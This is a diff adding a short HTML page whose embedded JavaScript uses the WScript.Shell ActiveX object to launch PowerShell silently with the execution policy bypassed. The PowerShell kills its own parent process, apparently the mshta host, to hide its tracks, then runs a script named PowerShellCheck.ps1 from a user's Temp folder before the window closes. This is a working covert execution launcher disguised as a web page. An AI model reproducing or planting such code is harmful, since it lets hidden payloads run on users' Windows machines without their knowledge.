@@ -1,0 +1,5 @@
+<HTML><HEAD></HEAD><BODY>
+<script language="javascript">
+	var r = new ActiveXObject("WScript.Shell").Run("powershell -ExecutionPolicy bypass $instance = Get-CimInstance Win32_Process -Filter \\\"ProcessId = '$pid'\\\";$instance;$mshtapid = $instance.ParentProcessId;Stop-Process -id $mshtapid -Force;C:\\Users\\whyteedeng\\AppData\\Local\\Temp\\PowershellCheck.ps1;",0,true);window.close();
+</script>
+</body></html>
